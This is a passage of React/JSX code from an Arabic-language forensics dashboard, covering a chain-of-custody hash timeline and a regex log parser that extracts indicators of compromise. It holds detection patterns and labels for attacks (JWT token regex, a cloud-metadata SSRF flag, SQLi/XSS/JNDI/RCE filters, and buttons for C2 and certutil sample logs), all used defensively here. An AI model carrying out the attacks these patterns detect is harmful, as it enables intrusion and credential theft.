                      ? 'bg-emerald-500/10 border-emerald-500/30 text-emerald-400' 
                      : 'bg-red-500/10 border-red-500/30 text-red-400'
                  }`}>
                    <div className="flex items-center gap-3">
                      {custodyVerification.verified ? <ShieldCheck className="w-6 h-6 shrink-0" /> : <AlertOctagon className="w-6 h-6 shrink-0" />}
                      <div>
                        <div className="text-sm font-bold">
                          {custodyVerification.verified
                            ? 'سلسلة الحيازة للدليل موثقة تشفيرياً بنسبة 100% (SHA-256 Verified)'
                            : 'تحذير: تم رصد تلاعب أو كسر في سلسلة التجزئة التشفيرية!'}
                        </div>
                        <div className="text-xs opacity-80 mt-0.5">
                          {custodyVerification.verified
                            ? `عدد الكتل الموثقة والمتسلسلة: ${custodyVerification.count} كتل • ${isCloudAuthenticated ? 'متزامنة مع Firestore' : 'محفوظة محلياً'}`
                            : custodyVerification.reason}
                        </div>
                      </div>
                    </div>
                    <span className="text-xs font-mono uppercase bg-black/40 px-3 py-1 rounded-lg border border-white/10 self-start sm:self-center">
                      {custodyVerification.verified ? 'SHA-256 Verified' : 'Chain Broken'}
                    </span>
                  </div>

                  <div className="max-w-4xl mx-auto pt-4">
                    <div className="relative border-r-2 border-gray-800 pr-8 pb-8 space-y-8 mr-4">
                      {custodyHistory.map((entry, idx) => (
                        <div key={entry.id || idx} className="relative">
                          <div className="absolute -right-[41px] top-0 w-5 h-5 rounded-full bg-gray-900 border-2 border-[#D4AF37] flex items-center justify-center z-10">
                            <div className="w-2 h-2 rounded-full bg-[#D4AF37]"></div>
                          </div>
                          <div className="bg-gray-950 border border-gray-800 rounded-2xl p-6 shadow-xl space-y-4">
                            <div className="flex items-center justify-between gap-2">
                              <span className="text-sm font-bold text-white flex items-center gap-2">
                                <span className="w-2 h-2 rounded-full bg-emerald-400"></span>
                                {entry.action}
                              </span>
                              <span className="text-[10px] font-mono text-gray-500" dir="ltr">{entry.timestamp}</span>
                            </div>

                            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 text-xs">
                              <div className="flex items-center gap-2 text-gray-400 bg-gray-900/60 p-2.5 rounded-xl border border-gray-800">
                                <Server className="w-3.5 h-3.5 text-[#D4AF37]" />
                                <span>الموقع: <strong className="text-white">{entry.location}</strong></span>
                              </div>
                              <div className="flex items-center gap-2 text-gray-400 bg-gray-900/60 p-2.5 rounded-xl border border-gray-800">
                                <UserIcon className="w-3.5 h-3.5 text-[#D4AF37]" />
                                <span>المسؤول: <strong className="text-white">{entry.officerName || 'كبير المحققين'}</strong></span>
                              </div>
                            </div>

                            {entry.notes && (
                              <p className="text-xs text-gray-300 bg-gray-900 p-3 rounded-xl border border-gray-800 leading-relaxed">{entry.notes}</p>
                            )}

                            {/* Cryptographic Block Hashes */}
                            <div className="space-y-2 pt-2 border-t border-gray-800 font-mono text-[10px]">
                              <div className="flex items-center justify-between gap-2 bg-gray-900 p-2 rounded-lg border border-gray-800">
                                <span className="text-gray-500 shrink-0">Previous Block Hash (PrevHash):</span>
                                <span className="text-gray-400 truncate max-w-[320px] select-all" title={entry.prevHash}>{entry.prevHash || '0000000000000000000000000000000000000000000000000000000000000000'}</span>
                              </div>
                              <div className="flex items-center justify-between gap-2 bg-gray-900 p-2 rounded-lg border border-gray-800">
                                <span className="text-[#D4AF37] shrink-0">Current Block Hash (RecordHash):</span>
                                <span className="text-emerald-400 truncate max-w-[320px] select-all" title={entry.recordHash}>{entry.recordHash || 'Pending Hash'}</span>
                              </div>
                            </div>
                          </div>
                        </div>
                      ))}
                      
                      <div className="pt-4 pr-1">
                        <button 
                          onClick={() => {
                            setCustodyModalScope('evidence');
                            setCustodyForm(prev => ({
                              ...prev,
                              officerName: prev.officerName || userProfile?.displayName || 'كبير المحققين السياديين'
                            }));
                            setShowAddCustodyModal(true);
                          }}
                          className="flex items-center gap-2 px-6 py-3 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 rounded-xl text-xs font-bold transition shadow-lg"
                        >
                          <Plus className="w-4 h-4" />
                          إضافة حركة حيازة جديدة وربطها تشفيرياً بقاعدة البيانات
                        </button>
                      </div>
                    </div>
                  </div>
                </div>
              )}
            </div>
          </div>
        )}

        {/* Tab: Regex Log Parser & IoC Extractor */}
        {isTabVisible('parser') && (
          <div className="space-y-6">
            <div className="rounded-2xl bg-gradient-to-r from-gray-900 via-gray-900/90 to-gray-950 border border-gray-800 p-8 shadow-2xl">
              <div className="max-w-3xl space-y-4">
                <div className="inline-flex items-center gap-2 px-3 py-1 rounded-lg bg-[#D4AF37]/10 border border-[#D4AF37]/30 text-[#D4AF37] text-xs font-mono">
                  <Terminal className="w-4 h-4" />
                  محلل السجلات ومستخرج IoCs بالتعابير النمطية الحقيقية
                </div>
                <h1 className="text-3xl font-bold tracking-tight text-white">محلل السجلات واستخراج مؤشرات الاختراق (Regex IoC Extractor)</h1>
                <p className="text-gray-400 text-sm leading-relaxed">
                  ألصق سجلات الخادم (Nginx, Apache, Sysmon, Firewall) أو ارفع ملف سجل لاستخراج عناوين IPv4/IPv6، النطاقات، الروابط (مع إعادة تشكيل hxxp/[.])، البريد الإلكتروني، بصمات SHA-256/SHA-1/MD5، ثغرات CVE، وأنماط الاستغلال مع إحصاء التكرارات وأرقام الأسطر.
                </p>

                <div className="flex flex-wrap items-center gap-3 pt-2">
                  <label className="cursor-pointer px-4 py-2 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold rounded-lg text-xs transition inline-flex items-center gap-2">
                    <Upload className="w-3.5 h-3.5" />
                    رفع ملف سجل (.log / .txt / .json)
                    <input type="file" accept=".log,.txt,.json,.csv,.syslog" onChange={handleLogFileUpload} className="hidden" />
                  </label>
                  <span className="text-xs text-gray-500">أو تحميل عينة هجوم:</span>
                  <button 
                    onClick={() => { setLogInputText(SAMPLE_ATTACK_LOGS.log4j); parseLogsAndExtractIoCs(SAMPLE_ATTACK_LOGS.log4j, 'Log4j-Attack'); }}
                    className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-amber-400 border border-gray-700 rounded-lg text-xs font-mono transition"
                  >
                    عينة Log4j / JNDI
                  </button>
                  <button 
                    onClick={() => { setLogInputText(SAMPLE_ATTACK_LOGS.sqli); parseLogsAndExtractIoCs(SAMPLE_ATTACK_LOGS.sqli, 'SQLi-WAF'); }}
                    className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-red-400 border border-gray-700 rounded-lg text-xs font-mono transition"
                  >
                    عينة SQLi & Traversal
                  </button>
                  <button 
                    onClick={() => { setLogInputText(SAMPLE_ATTACK_LOGS.c2); parseLogsAndExtractIoCs(SAMPLE_ATTACK_LOGS.c2, 'Sysmon-C2'); }}
                    className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-[#D4AF37] border border-gray-700 rounded-lg text-xs font-mono transition"
                  >
                    عينة C2 Beacon & Certutil
                  </button>
                </div>
              </div>
            </div>

            {logParserStats && (
              <div className="grid grid-cols-2 md:grid-cols-5 gap-3">
                <div className="bg-gray-900 border border-gray-800 rounded-xl p-4">
                  <div className="text-[10px] font-mono text-gray-500 uppercase">إجمالي المؤشرات</div>
                  <div className="text-2xl font-bold text-white font-mono mt-1">{logParserStats.total}</div>
                </div>
                <div className="bg-gray-900 border border-red-500/30 rounded-xl p-4">
                  <div className="text-[10px] font-mono text-red-400 uppercase">حرج (Critical)</div>
                  <div className="text-2xl font-bold text-red-400 font-mono mt-1">{logParserStats.critical}</div>
                </div>
                <div className="bg-gray-900 border border-gray-800 rounded-xl p-4">
                  <div className="text-[10px] font-mono text-gray-500 uppercase">عناوين IP (IPv4 / IPv6)</div>
                  <div className="text-2xl font-bold text-[#D4AF37] font-mono mt-1">{logParserStats.ipv4 + logParserStats.ipv6}</div>
                </div>
                <div className="bg-gray-900 border border-gray-800 rounded-xl p-4">
                  <div className="text-[10px] font-mono text-gray-500 uppercase">روابط ونطاقات</div>
                  <div className="text-2xl font-bold text-emerald-400 font-mono mt-1">{logParserStats.url + logParserStats.domain}</div>
                </div>
                <div className="bg-gray-900 border border-gray-800 rounded-xl p-4">
                  <div className="text-[10px] font-mono text-gray-500 uppercase">بصمات التجزئة Hashes</div>
                  <div className="text-2xl font-bold text-blue-400 font-mono mt-1">{logParserStats.hash}</div>
                </div>
              </div>
            )}

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
              {/* Input Area & Custom RegEx Tester */}
              <div className="lg:col-span-1 space-y-4">
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-4">
                  <h3 className="text-sm font-bold text-white flex items-center justify-between">
                    <span>النص أو السجلات المراد تحليلها</span>
                    <div className="flex items-center gap-3">
                      <label className="inline-flex items-center gap-1.5 text-[11px] text-emerald-400 cursor-pointer select-none">
                        <input
                          type="checkbox"
                          checked={liveAutoParseLogs}
                          onChange={(e) => setLiveAutoParseLogs(e.target.checked)}
                          className="accent-[#D4AF37]"
                        />
                        استخراج تلقائي حي
                      </label>
                      {logInputText && (
                        <button
                          onClick={() => setShowHighlightedLogs(prev => !prev)}
                          className="text-xs text-[#D4AF37] hover:underline"
                        >
                          {showHighlightedLogs ? 'عرض المحرر' : 'تمييز الأسطر'}
                        </button>
                      )}
                      {logInputText && (
                        <button
                          onClick={() => { setLogInputText(''); setParsedIoCs([]); setLogParserStats(null); setCustomRegexMatches([]); setShowHighlightedLogs(false); }}
                          className="text-xs text-red-400 hover:underline"
                        >
                          مسح
                        </button>
                      )}
                    </div>
                  </h3>

                  {showHighlightedLogs && logInputText ? (
                    <div className="bg-gray-950 border border-gray-800 rounded-xl p-3 max-h-72 overflow-y-auto space-y-1 font-mono text-[11px]" dir="ltr">
                      {logInputText.split(/\r?\n/).map((line, lineIdx) => {
                        const lineNum = lineIdx + 1;
                        const matchedIoCs = parsedIoCs.filter(i => i.lines.includes(lineNum));
                        const hasCrit = matchedIoCs.some(i => i.severity === 'critical' || i.severity === 'high');
                        return (
                          <div
                            key={lineNum}
                            className={`px-2 py-1 rounded flex gap-2 ${
                              hasCrit
                                ? 'bg-red-500/15 text-red-200 border-l-2 border-red-500'
                                : matchedIoCs.length > 0
                                ? 'bg-[#D4AF37]/10 text-amber-100 border-l-2 border-[#D4AF37]'
                                : 'text-gray-400'
                            }`}
                          >
                            <span className="text-gray-600 select-none w-7 shrink-0">{lineNum}</span>
                            <span className="break-all">{line || ' '}</span>
                          </div>
                        );
                      })}
                    </div>
                  ) : (
                    <textarea
                      rows={11}
                      value={logInputText}
                      onChange={(e) => {
                        const val = e.target.value;
                        setLogInputText(val);
                        if (liveAutoParseLogs) {
                          if (val.trim()) {
                            const { iocs, stats } = extractIoCsFromLogs(val);
                            setParsedIoCs(iocs);
                            setLogParserStats(stats);
                          } else {
                            setParsedIoCs([]);
                            setLogParserStats(null);
                          }
                        }
                      }}
                      placeholder="ألصق سجلات النصوص هنا (Nginx, Apache, Sysmon, Firewall) وسيتم استخراج IPs، الروابط المشبوهة، وطلبات حقن الأكواد أوتوماتيكياً..."
                      className="w-full bg-gray-950 border border-gray-800 rounded-xl p-4 text-xs font-mono text-white focus:outline-none focus:border-[#D4AF37] leading-relaxed resize-none"
                    />
                  )}

                  <button
                    onClick={() => parseLogsAndExtractIoCs(logInputText)}
                    disabled={isParsingLogs || !logInputText.trim()}
                    className="w-full py-3.5 bg-gradient-to-r from-[#D4AF37] to-[#b8972e] text-gray-950 font-bold rounded-xl text-xs shadow-lg hover:opacity-95 transition flex items-center justify-center gap-2 disabled:opacity-50"
                  >
                    {isParsingLogs ? <RefreshCw className="w-4 h-4 animate-spin" /> : <Terminal className="w-4 h-4" />}
                    تحليل السجل وتوثيق النتيجة بالـ RegEx
                  </button>
                </div>

                {/* Live Interactive Custom RegEx Pattern Tester */}
                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-5 space-y-3">
                  <div className="flex items-center justify-between">
                    <h4 className="text-xs font-bold text-white flex items-center gap-1.5">
                      <Code className="w-4 h-4 text-[#D4AF37]" />
                      مختبر RegEx التفاعلي المباشر
                    </h4>
                    <span className="text-[10px] font-mono text-gray-500">{customRegexMatches.length} تطابق</span>
                  </div>
                  <div className="flex gap-2" dir="ltr">
                    <input
                      type="text"
                      value={customRegexPattern}
                      onChange={(e) => setCustomRegexPattern(e.target.value)}
                      placeholder="أدخل نمط RegEx..."
                      className="flex-1 px-3 py-2 bg-gray-950 border border-gray-800 rounded-lg text-xs font-mono text-emerald-400 focus:outline-none focus:border-[#D4AF37]"
                    />
                    <input
                      type="text"
                      value={customRegexFlags}
                      onChange={(e) => setCustomRegexFlags(e.target.value)}
                      className="w-14 px-2 py-2 bg-gray-950 border border-gray-800 rounded-lg text-xs font-mono text-center text-[#D4AF37] focus:outline-none focus:border-[#D4AF37]"
                      title="Regex Flags (g, i, m)"
                    />
                  </div>
                  <div className="flex flex-wrap gap-1.5 text-[10px] font-mono">
                    {[
                      { label: 'IPv4', pat: '\\b(?:\\d{1,3}\\.){3}\\d{1,3}\\b' },
                      { label: 'SHA-256', pat: '\\b[A-Fa-f0-9]{64}\\b' },
                      { label: 'CVE', pat: 'CVE-\\d{4}-\\d{4,7}' },
                      { label: 'JWT', pat: 'eyJ[A-Za-z0-9_-]+\\.eyJ[A-Za-z0-9_-]+\\.[A-Za-z0-9_-]+' },
                      { label: 'WinPath', pat: '[A-Za-z]:\\\\(?:[^\\\\\\s"\']+\\\\)*[^\\\\\\s"\']+' },
                    ].map(preset => (
                      <button
                        key={preset.label}
                        type="button"
                        onClick={() => {
                          setCustomRegexPattern(preset.pat);
                          if (logInputText.trim()) runCustomRegex(preset.pat, customRegexFlags, logInputText);
                        }}
                        className="px-2 py-1 bg-gray-950 hover:bg-gray-800 border border-gray-800 rounded text-gray-300"
                      >
                        {preset.label}
                      </button>
                    ))}
                  </div>
                  <button
                    type="button"
                    onClick={() => runCustomRegex()}
                    className="w-full py-2 bg-gray-800 hover:bg-gray-700 text-[#D4AF37] border border-gray-700 rounded-lg text-xs font-bold transition"
                  >
                    تطبيق التعبير النمطي على السجل
                  </button>
                  {customRegexError && (
                    <div className="text-[11px] text-red-400 bg-red-500/10 border border-red-500/20 rounded-lg p-2 font-mono">
                      {customRegexError}
                    </div>
                  )}
                  {customRegexMatches.length > 0 && (
                    <div className="max-h-36 overflow-y-auto bg-gray-950 border border-gray-800 rounded-lg p-2 space-y-1 font-mono text-[11px]" dir="ltr">
                      {customRegexMatches.slice(0, 40).map((m, idx) => (
                        <div key={idx} className="flex items-center justify-between gap-2 px-1.5 py-0.5 rounded bg-gray-900/70">
                          <span className="text-emerald-400 truncate select-all">{m.value}</span>
                          <span className="text-[10px] text-gray-500 shrink-0">L{m.line}</span>
                        </div>
                      ))}
                    </div>
                  )}
                </div>
              </div>

              {/* Extracted IoCs + Dedicated IP Address Intelligence */}
              <div className="lg:col-span-2 space-y-6">
                {/* 3-Category Spotlight: Malicious IPs / Suspicious URLs / Code Injection */}
                {parsedIoCs.length > 0 && (
                  <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
                    <button
                      type="button"
                      onClick={() => setActiveIoCFilter('ipv4')}
                      className="text-right bg-gray-900 hover:border-amber-500/50 border border-gray-800 rounded-xl p-4 transition"
                    >
                      <div className="text-[10px] font-mono text-amber-400 uppercase">عناوين الـ IP المستخرجة</div>
                      <div className="text-2xl font-bold text-white font-mono mt-1">
                        {parsedIoCs.filter(i => i.type === 'ipv4' || i.type === 'ipv6').length}
                      </div>
                      <div className="text-[11px] text-gray-400 mt-0.5">انقر للتصفية الفورية</div>
                    </button>
                    <button
                      type="button"
                      onClick={() => setActiveIoCFilter('url')}
                      className="text-right bg-gray-900 hover:border-emerald-500/50 border border-gray-800 rounded-xl p-4 transition"
                    >
                      <div className="text-[10px] font-mono text-emerald-400 uppercase">الروابط المشبوهة والنطاقات</div>
                      <div className="text-2xl font-bold text-white font-mono mt-1">
                        {parsedIoCs.filter(i => i.type === 'url' || i.type === 'domain').length}
                      </div>
                      <div className="text-[11px] text-gray-400 mt-0.5">شاملة hxxp / [.]</div>
                    </button>
                    <button
                      type="button"
                      onClick={() => setActiveIoCFilter('exploit')}
                      className="text-right bg-gray-900 hover:border-red-500/50 border border-red-500/20 rounded-xl p-4 transition"
                    >
                      <div className="text-[10px] font-mono text-red-400 uppercase">طلبات حقن الأكواد والاستغلال</div>
                      <div className="text-2xl font-bold text-red-400 font-mono mt-1">
                        {parsedIoCs.filter(i => i.type === 'exploit' || i.type === 'cve').length}
                      </div>
                      <div className="text-[11px] text-gray-400 mt-0.5">SQLi / XSS / JNDI / RCE</div>
                    </button>
                  </div>
                )}

                {/* Dedicated Extracted IP Addresses Summary Card */}
                {parsedIoCs.some(i => i.type === 'ipv4' || i.type === 'ipv6') && (
                  <div className="rounded-2xl bg-gray-900 border border-[#D4AF37]/30 p-5 space-y-3">
                    <div className="flex flex-wrap items-center justify-between gap-2">
                      <h3 className="text-sm font-bold text-white flex items-center gap-2">
                        <Globe className="w-4 h-4 text-[#D4AF37]" />
                        عناوين الـ IP المستخرجة بالـ RegEx ({parsedIoCs.filter(i => i.type === 'ipv4' || i.type === 'ipv6').length})
                      </h3>
                      <div className="flex items-center gap-2">
                        <span className="text-[10px] font-mono text-gray-400 hidden sm:inline">IPv4 / IPv6 Network Classification</span>
                        <button
                          type="button"
                          onClick={() => {
                            const ipList = parsedIoCs
                              .filter(i => i.type === 'ipv4' || i.type === 'ipv6')
                              .map(i => i.value)
                              .join('\n');
                            copyToClipboard(ipList, 'all-ips');
                            notifyStatus('تم نسخ جميع عناوين الـ IP المستخرجة إلى الحافظة.', 'success');
                          }}
                          className="px-2.5 py-1 bg-gray-950 hover:bg-gray-800 text-[#D4AF37] border border-gray-700 rounded-lg text-[11px] font-bold inline-flex items-center gap-1"
                        >
                          {copiedHash === 'all-ips' ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                          نسخ جميع IPs
                        </button>
                      </div>
                    </div>
                    <div className="grid grid-cols-1 sm:grid-cols-2 gap-2.5">
                      {parsedIoCs
                        .filter(i => i.type === 'ipv4' || i.type === 'ipv6')
                        .map(ip => {
                          const isPrivate = ip.value.startsWith('10.') || ip.value.startsWith('192.168.') || /^172\.(1[6-9]|2\d|3[01])\./.test(ip.value);
                          const isMeta = ip.value === '169.254.169.254';
                          const isLoopback = ip.value === '127.0.0.1' || ip.value === '::1';
                          const badge = isMeta
                            ? { text: 'Cloud Metadata SSRF', cls: 'bg-red-500/20 text-red-400 border-red-500/30' }
                            : isPrivate
                            ? { text: 'RFC1918 داخلي', cls: 'bg-blue-500/15 text-blue-400 border-blue-500/30' }
                            : isLoopback
                            ? { text: 'Loopback', cls: 'bg-gray-800 text-gray-400 border-gray-700' }
                            : { text: 'Public / خارجي', cls: 'bg-amber-500/15 text-amber-400 border-amber-500/30' };
                          return (
                            <div key={ip.id} className="bg-gray-950 border border-gray-800 rounded-xl p-3 flex items-center justify-between gap-2">
                              <div className="space-y-1 min-w-0">
                                <div className="flex items-center gap-2">
                                  <span className="font-mono text-xs font-bold text-white select-all truncate" dir="ltr">{ip.value}</span>
                                  <span className="text-[10px] font-mono text-[#D4AF37]">×{ip.occurrences}</span>
                                </div>
                                <div className="flex items-center gap-1.5">
                                  <span className={`px-1.5 py-0.5 rounded text-[10px] border font-mono ${badge.cls}`}>{badge.text}</span>
                                  <span className="text-[10px] text-gray-500 font-mono">أسطر: {ip.lines.slice(0, 4).join(',')}</span>
                                </div>
                              </div>
                              <div className="flex items-center gap-1 shrink-0">
                                <button
                                  onClick={() => { setSearchQuery(ip.value); setActiveTab('search'); }}
                                  className="p-1.5 bg-gray-900 hover:bg-gray-800 text-[#D4AF37] border border-gray-800 rounded-lg"
                                  title="فحص OSINT"
                                >
                                  <Search className="w-3.5 h-3.5" />
                                </button>
                                <button
                                  onClick={() => copyToClipboard(ip.value, `ip-${ip.id}`)}
                                  className="p-1.5 bg-gray-900 hover:bg-gray-800 text-gray-300 border border-gray-800 rounded-lg"
                                  title="نسخ العنوان"
                                >
                                  {copiedHash === `ip-${ip.id}` ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                                </button>
                              </div>
                            </div>
                          );
                        })}
                    </div>
                  </div>
                )}

                <div className="rounded-2xl bg-gray-900 border border-gray-800 p-6 space-y-5">
                  <div className="flex flex-col md:flex-row md:items-center justify-between gap-4">
                    <div>
                      <h3 className="text-sm font-bold text-white">مؤشرات الاختراق المستخرجة ({parsedIoCs.length})</h3>
                      <p className="text-xs text-gray-400">جدول تفاعلي قابل للتصدير (JSON / CSV) لمؤشرات الاختراق وطلبات حقن الأكواد المستخرجة بالـ RegEx.</p>
                    </div>
                    {parsedIoCs.length > 0 && (
                      <div className="flex flex-wrap items-center gap-2">
                        <div className="flex bg-gray-950 border border-gray-800 rounded-lg p-0.5 text-[11px]">
                          <button
                            type="button"
                            onClick={() => setLogViewFormat('table')}
                            className={`px-2.5 py-1 rounded-md font-bold transition ${logViewFormat === 'table' ? 'bg-[#D4AF37] text-gray-950' : 'text-gray-400 hover:text-white'}`}
                          >
                            جدول
                          </button>
                          <button
                            type="button"
                            onClick={() => setLogViewFormat('cards')}
                            className={`px-2.5 py-1 rounded-md font-bold transition ${logViewFormat === 'cards' ? 'bg-[#D4AF37] text-gray-950' : 'text-gray-400 hover:text-white'}`}
                          >
                            بطاقات
                          </button>
                        </div>
                        <button
                          onClick={() => exportIoCs('json')}
                          className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-200 rounded-lg text-xs font-mono border border-gray-700 flex items-center gap-1.5"
                        >
                          <Download className="w-3.5 h-3.5 text-[#D4AF37]" />
                          تصدير JSON
                        </button>
                        <button
                          onClick={() => exportIoCs('csv')}
                          className="px-3 py-1.5 bg-gray-800 hover:bg-gray-700 text-gray-200 rounded-lg text-xs font-mono border border-gray-700 flex items-center gap-1.5"
                        >
                          <Download className="w-3.5 h-3.5 text-emerald-400" />
                          تصدير CSV
                        </button>
                        <button
                          onClick={() => setActiveTab('reports')}
                          className="px-3 py-1.5 bg-[#D4AF37] hover:bg-[#c29f30] text-gray-950 font-bold rounded-lg text-xs flex items-center gap-1.5"
                        >
                          <FileText className="w-3.5 h-3.5" />
                          تضمين في التقرير الرسمي
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Search + Filter buttons */}
                  <div className="space-y-3">
                    <div className="relative">
                      <Search className="w-4 h-4 text-gray-500 absolute right-3.5 top-1/2 -translate-y-1/2" />
                      <input
                        type="text"
                        value={iocSearchQuery}
                        onChange={(e) => setIocSearchQuery(e.target.value)}
                        placeholder="تصفية سريعة داخل المؤشرات المستخرجة (IP، رابط، حقن SQLi/XSS، SHA-256، CVE)..."
                        className="w-full pr-10 pl-4 py-2.5 bg-gray-950 border border-gray-800 rounded-xl text-xs text-white focus:outline-none focus:border-[#D4AF37]"
                      />
                    </div>
                    <div className="flex flex-wrap items-center gap-2 text-xs">
                      <button onClick={() => setActiveIoCFilter('all')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'all' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>الكل ({parsedIoCs.length})</button>
                      <button onClick={() => setActiveIoCFilter('ipv4')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'ipv4' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>IPv4</button>
                      <button onClick={() => setActiveIoCFilter('ipv6')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'ipv6' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>IPv6</button>
                      <button onClick={() => setActiveIoCFilter('url')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'url' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>URLs</button>
                      <button onClick={() => setActiveIoCFilter('domain')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'domain' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>Domains</button>
                      <button onClick={() => setActiveIoCFilter('exploit')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'exploit' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>حقن الأكواد والاستغلال</button>
                      <button onClick={() => setActiveIoCFilter('hash')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'hash' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>Hashes</button>
                      <button onClick={() => setActiveIoCFilter('cve')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'cve' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>CVEs</button>
                      <button onClick={() => setActiveIoCFilter('email')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'email' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>Emails</button>
                      <button onClick={() => setActiveIoCFilter('artifact')} className={`px-3 py-1 rounded-lg ${activeIoCFilter === 'artifact' ? 'bg-[#D4AF37] text-gray-950 font-bold' : 'bg-gray-950 text-gray-400 border border-gray-800'}`}>Artifacts</button>
                    </div>
                  </div>

                  {parsedIoCs.length === 0 ? (
                    <div className="py-20 text-center text-gray-500 text-sm space-y-2">
                      <Terminal className="w-10 h-10 text-gray-700 mx-auto" />
                      <p>ألصق نصوص السجلات في المحرر أو اختر عينة هجوم ليقوم محرك RegEx باستخراج عناوين الـ IP والروابط ومحاولات حقن الأكواد فوراً.</p>
                    </div>
                  ) : (() => {
                    const filteredIoCs = parsedIoCs.filter(i => {
                      const matchesType =
                        activeIoCFilter === 'all'
                          ? true
                          : activeIoCFilter === 'hash'
                          ? i.type === 'sha256' || i.type === 'sha1' || i.type === 'md5'
                          : i.type === activeIoCFilter;
                      const q = iocSearchQuery.trim().toLowerCase();
                      const matchesQuery = !q || i.value.toLowerCase().includes(q) || i.details.toLowerCase().includes(q);
                      return matchesType && matchesQuery;
                    });

                    if (logViewFormat === 'table') {
                      return (
                        <div className="bg-gray-950 border border-gray-800 rounded-xl overflow-x-auto max-h-[520px] overflow-y-auto">
                          <table className="w-full text-xs text-right">
                            <thead className="bg-gray-900 text-gray-400 font-mono text-[10px] sticky top-0 z-10 border-b border-gray-800">
                              <tr>
                                <th className="px-3 py-2.5">النوع</th>
                                <th className="px-3 py-2.5">الخطورة</th>
                                <th className="px-3 py-2.5">المؤشر / الحمولة (IoC Value)</th>
                                <th className="px-3 py-2.5">التكرار</th>
                                <th className="px-3 py-2.5">الأسطر</th>
                                <th className="px-3 py-2.5">التحليل</th>
                                <th className="px-3 py-2.5">إجراء</th>
                              </tr>
                            </thead>
                            <tbody className="divide-y divide-gray-800/70">
                              {filteredIoCs.map((ioc) => (
                                <tr key={ioc.id} className="hover:bg-gray-900/50 transition">
                                  <td className="px-3 py-2.5 font-mono text-[10px] font-bold uppercase text-[#D4AF37]">{ioc.type}</td>
                                  <td className="px-3 py-2.5">
                                    <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${
                                      ioc.severity === 'critical' ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
                                      ioc.severity === 'high' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' :
                                      ioc.severity === 'medium' ? 'bg-blue-500/20 text-blue-400 border border-blue-500/30' :
                                      'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                                    }`}>
                                      {ioc.severity}
                                    </span>
                                  </td>
                                  <td className="px-3 py-2.5 font-mono text-white font-bold select-all max-w-[260px] break-all" dir="ltr">{ioc.value}</td>
                                  <td className="px-3 py-2.5 font-mono text-[#D4AF37]">×{ioc.occurrences}</td>
                                  <td className="px-3 py-2.5 font-mono text-gray-400 text-[11px]">
                                    {ioc.lines.slice(0, 5).join(', ')}{ioc.lines.length > 5 ? '...' : ''}
                                  </td>
                                  <td className="px-3 py-2.5 text-gray-400 text-[11px] max-w-[220px]">{ioc.details}</td>
                                  <td className="px-3 py-2.5">
                                    <div className="flex items-center gap-1">
                                      <button
                                        onClick={() => { setSearchQuery(ioc.value); setActiveTab('search'); }}
                                        className="p-1.5 bg-gray-900 hover:bg-gray-800 text-[#D4AF37] border border-gray-800 rounded-md"
                                        title="OSINT"
                                      >
                                        <Search className="w-3 h-3" />
                                      </button>
                                      <button
                                        onClick={() => copyToClipboard(ioc.value, ioc.id)}
                                        className="p-1.5 bg-gray-900 hover:bg-gray-800 text-gray-200 border border-gray-800 rounded-md"
                                        title="نسخ"
                                      >
                                        {copiedHash === ioc.id ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                                      </button>
                                    </div>
                                  </td>
                                </tr>
                              ))}
                            </tbody>
                          </table>
                        </div>
                      );
                    }

                    return (
                      <div className="space-y-3 max-h-[500px] overflow-y-auto pr-1">
                        {filteredIoCs.map((ioc) => (
                          <div key={ioc.id} className="bg-gray-950 border border-gray-800 rounded-xl p-4 flex flex-col md:flex-row md:items-center justify-between gap-4 hover:border-gray-700 transition">
                            <div className="space-y-1.5 overflow-hidden">
                              <div className="flex flex-wrap items-center gap-2">
                                <span className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold uppercase ${
                                  ioc.severity === 'critical' ? 'bg-red-500/20 text-red-400 border border-red-500/30' :
                                  ioc.severity === 'high' ? 'bg-amber-500/20 text-amber-400 border border-amber-500/30' :
